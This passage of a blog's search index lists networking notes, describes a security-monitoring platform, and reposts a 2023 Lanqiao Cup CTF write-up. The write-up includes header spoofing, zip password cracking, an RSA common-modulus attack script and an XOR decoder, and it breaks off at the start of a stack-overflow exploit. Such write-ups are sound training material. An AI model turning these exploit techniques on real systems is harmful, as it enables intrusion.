class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络工程相关整理汇总</title>
      <link href="/2024/01/01/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86%E6%B1%87%E6%80%BB/"/>
      <url>/2024/01/01/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="物理层："><a href="#物理层：" class="headerlink" title="物理层："></a>物理层：</h3><blockquote><p>负责定义传输数据的物理媒体和连接的电气特性。物理层关注的是比特流的传输，它定义了硬件设备之间的接口和传输媒体的特性，如电压、电流和光信号等 </p></blockquote><p>物理层规程</p><h3 id="数据链路层："><a href="#数据链路层：" class="headerlink" title="数据链路层："></a>数据链路层：</h3><h4 id="常规特性："><a href="#常规特性：" class="headerlink" title="常规特性："></a>常规特性：</h4><ul><li><h5 id="生成树协议"><a href="#生成树协议" class="headerlink" title="生成树协议"></a><a href="https://shierjinghuang.github.io/2022/11/21/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/">生成树协议</a></h5></li></ul><h4 id="高级特性："><a href="#高级特性：" class="headerlink" title="高级特性："></a>高级特性：</h4><ul><li><h5 id="生成树的改进-RSTP与MSTP-https-shierjinghuang-github-io-2023-03-06-生成树的改进-RSTP与MSTP"><a href="#生成树的改进-RSTP与MSTP-https-shierjinghuang-github-io-2023-03-06-生成树的改进-RSTP与MSTP" class="headerlink" title="[生成树的改进 RSTP与MSTP](https://shierjinghuang.github.io/2023/03/06/生成树的改进 RSTP与MSTP/)"></a>[生成树的改进 RSTP与MSTP](<a href="https://shierjinghuang.github.io/2023/03/06/%E7%94%9F%E6%88%90%E6%A0%91%E7%9A%84%E6%94%B9%E8%BF%9B">https://shierjinghuang.github.io/2023/03/06/生成树的改进</a> RSTP与MSTP/)</h5></li></ul><h3 id="网际层："><a href="#网际层：" class="headerlink" title="网际层："></a>网际层：</h3><blockquote><p>网际层主要负责在不同的网络之间进行数据包的路由和转发，以确保数据能够从源主机传递到目标主机。该层定义了数据包的传输路径，决定了最佳的路径选择，以实现端到端的通信 </p></blockquote><h4 id="常规特性：-1"><a href="#常规特性：-1" class="headerlink" title="常规特性："></a>常规特性：</h4><blockquote><p>网际层常规特性包含日常学习中的关于网络协议的各种内容</p></blockquote><ul><li><h5 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a><a href="https://shierjinghuang.github.io/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/">网际协议IP</a></h5></li><li><h5 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a><a href="https://shierjinghuang.github.io/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/">动态主机配置协议DHCP</a></h5></li><li><h5 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a><a href="https://shierjinghuang.github.io/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/">地址解析协议 ARP</a></h5></li><li><h5 id="链路状态路由协议IS-IS"><a href="#链路状态路由协议IS-IS" class="headerlink" title="链路状态路由协议IS-IS"></a><a href="https://shierjinghuang.github.io/2023/03/26/%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AEIS-IS/">链路状态路由协议IS-IS</a></h5></li><li><h5 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a><a href="https://shierjinghuang.github.io/2022/11/16/IGMP/">Internet组管理协议IGMP</a></h5></li><li><h5 id="动态主机配置协议DHCP-1"><a href="#动态主机配置协议DHCP-1" class="headerlink" title="动态主机配置协议DHCP"></a><a href="https://shierjinghuang.github.io/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/">动态主机配置协议DHCP</a></h5></li></ul><h4 id="高级特性：-1"><a href="#高级特性：-1" class="headerlink" title="高级特性："></a>高级特性：</h4><blockquote><p>IPv6协议栈： IPv6协议栈是指一套软件和硬件组件，用于实现和支持IPv6协议的网络通信。它包括各种层次的协议、服务和功能，以确保设备能够正确地使用IPv6进行通信 </p></blockquote><ul><li><p><strong><a href="https://shierjinghuang.github.io/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/">IPv6协议结构</a></strong></p></li><li><h5 id="IPv6过渡技术"><a href="#IPv6过渡技术" class="headerlink" title="IPv6过渡技术"></a><a href="https://shierjinghuang.github.io/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/">IPv6过渡技术</a></h5></li></ul><ul><li><h5 id="IGP高级特性"><a href="#IGP高级特性" class="headerlink" title="IGP高级特性"></a><a href="https://shierjinghuang.github.io/2024/01/01/IGP%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/">IGP高级特性</a></h5><blockquote><p>IGP高级特性包括多种快速收敛和保护机制，用于降低网络故障导致的流量丢失，以及路由选路及路由信息的控制，能够减少特定路由器路由表的大小</p></blockquote></li><li></li></ul><h3 id="传输层："><a href="#传输层：" class="headerlink" title="传输层："></a>传输层：</h3><ul><li><h5 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a><a href="https://shierjinghuang.github.io/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/">传输层协议TCP与UDP</a></h5></li></ul><h3 id="应用层："><a href="#应用层：" class="headerlink" title="应用层："></a>应用层：</h3><ul><li><h5 id="RIP协议"><a href="#RIP协议" class="headerlink" title="RIP协议:"></a><a href="https://shierjinghuang.github.io/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/">RIP协议</a>:</h5><blockquote><p>rip是被当作一个应用层进程来实现的，所以它能在一个标准套接字上发送和接收报文，并且使用一个标准的运输层协议。RIP是一个运行在UDP上的应用层协议</p></blockquote></li><li><h5 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a><a href="https://shierjinghuang.github.io/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/">超文本传输协议HTTP</a></h5></li><li><h5 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a><a href="https://shierjinghuang.github.io/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/">文件传输协议FTP</a></h5></li></ul><h3 id="汇总："><a href="#汇总：" class="headerlink" title="汇总："></a>汇总：</h3><ul><li><p><a href="https://shierjinghuang.github.io/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/">IPV4网络协议分析汇总</a></p></li><li><p><a href="https://shierjinghuang.github.io/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/">IPv6协议部分</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HCIP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全态势感知与管控平台</title>
      <link href="/2023/10/02/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E4%B8%8E%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0/"/>
      <url>/2023/10/02/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E4%B8%8E%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="安全态势感知与管控平台">安全态势感知与管控平台</h2><p>[TOC]</p><h3 id="1-面临问题和挑战">1. 面临问题和挑战</h3><h4 id="1-1-面临问题">1.1. 面临问题</h4><p>随着各类信息技术及软硬件系统的持续演进，信息安全问题日益严峻，而且我国当前信息系统安全产业及相关安全法律法规及其标准也不甚完善，这导致国内信息安全保障工作严重滞后于信息技术发展的速度。</p><p>由此，目前各企业 IT 系统安全面临巨大的困境，主要包括：</p><ul><li>落后的边界隔离理念 VS 灵活多变的渗透技术</li><li>日益臃肿的攻击特征库 VS 专业智能的 SaaS 服务</li><li>一片祥和的监控页面 VS 暗流涌动的隐蔽信道</li></ul><p>总而言之，只重视边界的防护，而忽视内部系统的安全问题的传统观念已经 无法适应当前日益严峻的安全形势；没有安全事件和告警不等于没有被攻击者盯 上和攻击。</p><h4 id="1-2-当前挑战">1.2. 当前挑战</h4><p>企业面临的信息安全挑战包括：</p><ol><li><p>企业购置了大量安全设备及产品，但这些产品所报告出来的问题往往不是难于理解就是极其分散，从而无法确定当前企业的网络和系统运行到底是否安全；</p></li><li><p>一般安全设备所报告的安全事件，往往存在误报率高，需要人工甄别；</p></li><li><p>传统安全设备或系统只会报告当前发生了什么，而无法对未来的安全形势进行预判，简而言之，就是缺乏一定的安全形势预估能力；</p></li><li><p>传统的安全设备，如入侵检测或入侵防护一般不会存储过程数据，所以在出现安全问题时，完全无法对历史数据进行回溯，所以如何调查安全事件变成了不可能的任务；</p></li><li><p>一般的传统的安全设备，无论是防火墙、入侵检测/入侵防护、防病毒等系统都是利用特征库对相关安全问题进行检测，如果数据被加密或者被做了免杀处理，则无能为力。</p></li></ol><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\企业面临的信息安全挑战.png" style="zoom:80%;" /><h3 id="2-客户需求">2. 客户需求</h3><p>针对上述问题和挑战，一般企业的信息安全管理人员不仅对各类<strong>安全合规</strong>方面功能有着较高要求，而且对这在<strong>日常安全问题的发现、潜在问题的萃取、未发生问题的预防</strong>等都有较高期望，特别是对于一些<strong>隐蔽安全问题的追根溯源</strong>（包括各类高级持续威胁等），也有现实需求，包括：</p><ol><li><p>通过企业网站等途径的外部渗透行为；</p></li><li><p>通过邮件钓鱼等途径的鱼叉攻击行为；</p></li><li><p>访问控制混乱而导致的隐蔽通道或服务端口暴露问题；</p></li><li><p>内部潜在威胁源或威胁用户的发现；</p></li><li><p>潜在的数据泄露或外传风险；</p></li><li><p>安全问题爆发时的预警和处置；</p></li><li><p>其它各类用户或异常行为的侦测，如异常地区访问、异常时间访问、异常访问次数、异常用户类别等。</p></li></ol><h3 id="3-安全态势与管控平台解决方案">3. 安全态势与管控平台解决方案</h3><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\安全态势与管控平台解决方案.png" style="zoom:50%;" /><p>网络科技自主开发的基于大数据技术的安全态势感知与管控平台，统一采集各类结构化和非结构化的数据，包括各类设备、应用日志以及网络流量和各种脆弱性，提供基于标准风险模型通过实时分析、离线分析、关联分析、统计分析、规则库、专家经验库以及外部安全情报的交换、机器学习等多方位进行风险分析。</p><p>安全态势感知与管控平台，充分收集各类安全相关数据，通过大范围和深度地广泛检查，尽可能发现相关安全问题</p><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\全方位的信息采集.png" style="zoom: 80%;" /><h4 id="3-1-解决方案整体框架">3.1. 解决方案整体框架</h4><p>安全态势感知与管控平台，具有完全分布式的数据采集和分析框架，包含了数据采集、数据预处理、数据分析、高级分析、数据可视以及安全处理和响应、安全知识库（含漏洞库、安全事件库、安全配置库等等），如下图所示：</p><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\解决方案整体框架.png" style="zoom: 50%;" /><h4 id="3-2-方案组成">3.2. 方案组成</h4><p>与传统的安全管理中心 [SOC]或下一代安全管理中心 [NGSOC]不完全相同的是 传统 SOC 或 [NGSOC 均是依赖于收集第三方日志或脆弱性，在问题的解读和追溯上存在非常大的不足，因而不足以支撑整体安全管理] ，由于安全态势感知与管控平台集成了众多自有的安全问题感知子模块，这些安全感知子模块包含了如下内容：</p><ul><li>网络攻击检测子模块</li><li>网络性能检测子模块</li><li>文件安全检测子模块</li><li>威胁情报检测子模块</li><li>日志安全审计子模块</li><li>漏洞扫描检查子模块</li><li>安全配置核查子模块</li></ul><p>另外，除上述基础安全检测子模块外，安全态势感知与管控平台还综合了如下高级安全检查功能：</p><ul><li>安全对象失陷分析子模块</li><li>安全问题告警分析子模块</li><li>主机及用户行为分析子模块</li><li>网站安全检测分析子模块</li><li>安全风险分析子模块</li></ul><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\安全态势感知模块与子模块的对应.png" style="zoom: 50%;" /><p>除了上述各类模块外，为了向用户提供完善的安全运维能力，安全态势感知与管控平台提供了完善的安全资产管理模块、安全运维工单模块以及安全知识库等模块。</p><h4 id="3-3-解决的安全问题">3.3. 解决的安全问题</h4><p>以下就安全态势感知与管控平台能够探知和发现的安全问题进行探讨。</p><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\网络安全问题分层.png" style="zoom: 80%;" /><h5 id="3-3-1-网站安全">3.3.1 网站安全</h5><p>众所周知，网站是企业等单位的重要信息资产，网站的安全问题不仅关乎企业的网络安全问题，更重要的是如果其被随意篡改或者修改则会造成严重的政治问题或声誉问题。</p><p>安全态势感知与管控平台包含独有技术对网站的安全状况进行检查，其检查的范围主要包含针对网站漏洞的攻击或渗透行为、各种网站链接挂马行为、网页篡改行为以及其它针对网站的拒绝服务攻击、一般漏洞扫描等等。</p><h5 id="3-3-2-数据库安全">3.3.2 数据库安全</h5><p>除了网站以外，数据库是企业另一个特别重要的信息资产，数据库出现安全问题会对企业的信息安全工作以及日常工作产生毁灭性的打击，如 2018 年出现的XX酒店将关键数据库信息暴露在公网上（其数据库类型为 MySQL）而且密码极其简单，直接被一般黑客所破解，导致大量重要客户数据的信息泄露，对企业声誉造成了不可挽回的损失</p><h5 id="3-3-3-企业内网安全">3.3.3 企业内网安全</h5><p>包括北向安全以及东西向安全，因为经权威机构调研，信息安全的堡垒一般总是从内部被攻破的，这主要是存在如下原因：</p><ol><li><p>内部系统移动介质的滥用，导致各类僵尸、蠕虫以及木马等恶意软件的传播；</p></li><li><p>企业员工由于存在各种好奇心，会有意或无意地打开各类钓鱼邮件，从而导致其工作计算机沦陷；</p></li><li><p>企业员工在上网时，下载和安装了一些做过免杀处理的软件从而导致被种植了木马、矿机；</p></li><li><p>另外，企业员工在上网时，由于其系统没有及时更新相关软件，从而被直接渗透</p></li><li><p>最后，也不排除一些别有用心的员工故意在办公网或生产网传播恶意软件，从而导致企业信息安全的问题。</p></li></ol><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\内网安全.png" style="zoom:80%;" /><p>通过安全态势感知与管控平台可以充分发现南北向以及各类东西向安 全问题，包括诸如各类木马行为、隐蔽通道连接、勒索软件行为（含与服务器通讯以及横向传播）以及各类电子加密货币矿机行为，充分保障内部服务器及用户 终端的安全，避免造成各类损失。</p><h3 id="4-主要功能简介">4. 主要功能简介</h3><h4 id="4-1-对象失陷风险感知">4.1. 对象失陷风险感知</h4><p>在安全态势感知与管控平台中，对象不仅包含了各种形态的资产信息，还包括各类没有被纳入到资产的对象，这些对象可能是各类服务器或主机以及账 号或网站，故一般用户无需配置资产也可以对相关对象的失陷问题进行查看和处 理，这大大降低了初次使用本平台的门槛，也减轻了相关配置工作。 对象失陷的含义是相关主机、账号、网站等对象由于某些原因，如遭受鱼叉 攻击或水坑攻击而被植入各类木马、勒索软件以及蠕虫等恶意程序，从而产生相应的异常行为，导致重要数据被泄漏、重要文件被加密等；严重还会在内网（包括工作网络或生产网络等）肆意传播（横向传播）最终造成企业相关重要信息资产（不仅指有形资产还包括无形资产）的损失。</p><p>一般而言对象的失陷会包含探测、植入、回传、横向传播、收集数据以及数据外穿等若干阶段，如果在其中任意一环发现问题，则能够防止损失，评估对象失陷风险的感知是安全态势感知与管控平台的核心内容</p><h4 id="4-2-外部攻击威胁感知">4.2. 外部攻击威胁感知</h4><p>所谓外部威胁是指有外网主机或系统对内网的主机或系统发起的网络攻击或可能的非法连接及探测。</p><p>网络攻击一般是指攻击者利用受害者主机或系统存在的一些缺陷/漏洞或者 配置上的不足或者网络拓扑存在的问题，使用专用工具或手段对其进行探测、尝试、渗透，试图最终获得目标主机或系统的控制权，或者使受害者无法正常运行。</p><p>另外，可能的非法连接是指利用受害者主机或系统在某种情况下出现了不应暴露的端口，从而被非法入侵者所利用，如错误地将一些远程登录服务、数据库服务等暴露在公网环境。</p><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\外部威胁感知.png" style="zoom:50%;" /><h4 id="4-3-外连攻击威胁感知">4.3.外连攻击威胁感知</h4><p>所谓外连威胁是指内网主机或系统对外网相关主机或系统发起的攻击或可疑连接，若存在此类威胁则说明内网主机可能存在失陷危险。</p><p>内网主机或系统的失陷原因可能存在多种可能，如因为从某些网站或服务器下载、安装了有害的程序或木马，或者被邮件钓鱼（如鱼叉攻击）诱使打开了危险邮件，或者插入移动介质而被感染了有害程序或木马，或者被内网其它主机所渗透而植入了有害程序；用户应特别重视此类危险；但也不排除内网有主机或系统主动发起了对外网的攻击。</p><p>从信息安全的角度而言，如果网络中出现外连攻击威胁，则其风险其实要较外部的攻击威胁更大，从而更应引起相关安全人员的注意。</p><h4 id="4-4-内部互连攻击威胁感知">4.4.内部互连攻击威胁感知</h4><p>所谓内部互连威胁是指有内网主机或系统对其它内网的主机或系统发起的网络攻击或可能的非法连接及探测。</p><p>内部互连攻击一般是指内网失陷主机对其它内网主机进行探测、尝试、渗透，试图最终获得目标主机或系统的控制权，从而在内网横向扩散、收集数据、破坏 系统。</p><p>其中，有一类为可能的非法连接是指利用受害者主机或系统在某种情况下出现了不应暴露的端口，从而被非法入侵者所利用，如错误地开放一些不应打开的端口。</p><h4 id="4-5-脆弱性感知">4.5.脆弱性感知</h4><p>脆弱性是一般是在部署时或运行时就自然存在于系统中的；系统运行的操作系统、应用软件均可能存在较为严重的脆弱性，另外错误或不当的配置也会造成系统存在脆弱性；</p><p>而安全态势感知与管控平台能够充分利用平台集成的相关工具对这些脆弱性进行主动的发现和提示，以防止用户由于不恰当的配置或者未能及时修补漏洞而造成的风险，从而导致出现口令被破解、漏洞（特别是网站资产）被利用 等安全事件的发生。</p><p>故脆弱性的感知也是“主动安全”的重要一环，可以做到防患于未然。</p><h4 id="4-6-云端综合安全感知">4.6.云端综合安全感知</h4><p>云端综合安全感知可以实时采集监控指标，提供及时有效的安全告警、响应，通过云端预警功能，根据不同行业和资产的系统类型，对可能存在的威胁，云端下发安全预警，线下及时排查和进行相关的安全防护。</p><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\云端综合安全感知.png" style="zoom:50%;" /><h3 id="5-产品优势">5. 产品优势</h3><h4 id="5-1-全面感知">5.1.全面感知</h4><ul><li>全面嵌入各类安全信息感知模块，数据来源覆盖全面，包括网络流量、日志及各类脆弱性</li><li>全面感知各层面安全态势问题，包括网络安全态势、主机安全态势、数据安 全态势、应用安全态势、行为等</li><li>全面监控各方面安全态势问题，包括各类网络东西向安全问题、南北向安全问题、脆弱性问题等</li></ul><h4 id="5-2-精准解析">5.2.精准解析</h4><ul><li>利用网络流量分析探针，解析各类主流网络协议，如 HTTP、DNS、SMTP 等， 对相关元数据可进行查询和分析，无需单独接入其它设备日志</li><li>开放的自有标准化语法解析器，灵活度高、精确度高、快速自定义标准化解析</li><li>内置了大量的标准化脚本，适应各类主流设备和系统的精确解析</li></ul><h4 id="5-3-精确分析">5.3. 精确分析</h4><p>关联场景：基于统计和基于关联</p><ul><li>基于统计包含：平均统计、方差统计，支持按天、按周统计</li><li>基于关联包含：状态关联、时序关联、归并关联、筛选关联、端口关联、多维度关联</li><li>支持事件与基线关联分析、事件与漏洞关联分析、事件与事件关联分析智能行为分析</li><li>对多方向网络连接数据及其它用户异常行为自动进行基线分析，无需配置</li></ul><h4 id="5-4-展示丰富">5.4. 展示丰富</h4><ul><li>丰富的图形化展示：仪表板、业务拓扑图</li><li>用户自定义仪表板展现业务数据</li><li>实时监控：便于发现异常、随时挖掘分析</li><li>热图分布：追踪攻击来源，发现幕后黑手</li></ul><h4 id="5-5-体系完整">5.5. 体系完整</h4><ul><li>系统可选内置网络流量探针，无需第三方提供网络攻击威胁数据接入支持</li><li>系统内置了漏洞扫描、基线检查等模块，主动检查，及时加固</li><li>通过日志与漏洞等关联分析被动防御，发现威胁，抵御风险</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 态势感知 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年蓝桥杯网络安全大赛</title>
      <link href="/2023/06/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
      <url>/2023/06/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2023年蓝桥杯网络安全大赛"><a href="#2023年蓝桥杯网络安全大赛" class="headerlink" title="2023年蓝桥杯网络安全大赛"></a>2023年蓝桥杯网络安全大赛</h1><p>[TOC]</p><h2 id="WP部分"><a href="#WP部分" class="headerlink" title="WP部分"></a>WP部分</h2><blockquote><p>怎么说呢因为蓝桥杯网络安全赛事的一些奇怪操作我没有报名，队内大佬参加并拿到了非常优秀的成绩，这是直接转的人家WP</p></blockquote><h3 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h3><h4 id="禁止访问"><a href="#禁止访问" class="headerlink" title="禁止访问"></a>禁止访问</h4><p>根据源代码提示，HackBar直接修改请求头Client-IP： </p><img src=".\蓝桥杯网络安全大赛\禁止访问.png" style="zoom: 33%;" /><h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><h4 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h4><p>WireShark找到flag.zip： </p><img src=".\蓝桥杯网络安全大赛\流量分析.png" style="zoom:50%;" /><p>发现需要解压密码，压缩包备注里告诉了密码的格式。使用ARCHPR破解： </p><img src=".\蓝桥杯网络安全大赛\压缩包密码爆破.png" style="zoom:50%;" /><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><h4 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h4><p>到Cyberchef，先ROT13（好像就是凯撒密码，解密时Amount需要调整），然后解Base64：</p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CCyberChef.png"></p><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>RSA共模攻击：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from Crypto.Util.number import *import gmpy2import randomrandom.seed(123456)e1 &#x3D; random.randint(100000000, 999999999)e2 &#x3D; 65537n &#x3D;7265521127830448713067411832186939510560957540642195787738901620268897564963900603849624938868472135068795683478994264434459545615489055678687748127470957m1 &#x3D;3315026215410356401822612597933850774333471554653501609476726308255829187036771889305156951657972976515685121382853979526632479380900600042319433533497363m2 &#x3D;1188105647021006315444157379624581671965264301631019818847700108837497109352704297426176854648450245702004723738154094931880004264638539450721642553435120gcd, s, t &#x3D; gmpy2.gcdext(e1, e2)if s &lt; 0:s &#x3D; -sm1 &#x3D; gmpy2.invert(m1, n)if t &lt; 0:t &#x3D; -tm2 &#x3D; gmpy2.invert(m2, n)m1 &#x3D; gmpy2.powmod(m1, s, n)m2 &#x3D; gmpy2.powmod(m2, t, n)m &#x3D; m1 * m2 % nflag &#x3D; long_to_bytes(m)print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>直接IDA动态调试，在main函数return时，可以看到原来变量v5的内容经过RC4被改成了flag： </p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CRC4.png"></p><h4 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h4><p>程序将明文和key进行异或，我们直接将密文再异或一次就得到flag。 </p><p><img src=".%5C%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5CXOR.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">'SEcRET7'</span>enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> enc<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞挖掘分析"><a href="#漏洞挖掘分析" class="headerlink" title="漏洞挖掘分析"></a>漏洞挖掘分析</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>gets函数栈溢出漏洞，直接修改返回地址为后门函数即可： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token 